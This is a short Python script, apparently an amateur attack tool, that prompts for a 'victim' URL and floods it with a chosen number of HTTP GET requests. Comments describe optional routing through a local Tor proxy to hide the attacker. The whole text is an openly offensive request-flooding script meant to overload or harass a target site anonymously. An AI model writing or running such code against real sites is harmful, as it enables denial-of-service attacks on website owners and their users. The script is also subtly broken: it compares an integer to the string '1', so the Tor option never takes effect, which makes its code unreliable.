#turn on Tor browser in cmd for this to work
#write command ./start-tor-browser in Linux
#write command tor.exe -f torrc in Windows
import requests
target = str(input('Write the full web address of the victim\t'))
times = int(input('How many times to brute force the victim?\t'))
security = int(input('Do you want your attack to be routed through Tor? It will slow the attack down. Write "1" for yes, "0" for no\t'))
if security == "1":
   def get_tor_session():
       session = requests.session() #this starts to modify the nature of the connection
       session.proxies = {'http':  'socks5h://localhost:9050', #adding Tor proxies for anoymity
                          'https': 'socks5h://localhost:9050'}
       return session #using this as a func helps us to choose whether to use proxies or not
   for i in range(times):    
       session = get_tor_session() #as you have picked security over speed, we are using proxies
       print(session.get(target)) #using the modified connection settings, we attack the victim
else: #speed > security
    for i in range(times):
        print(requests.get(target))
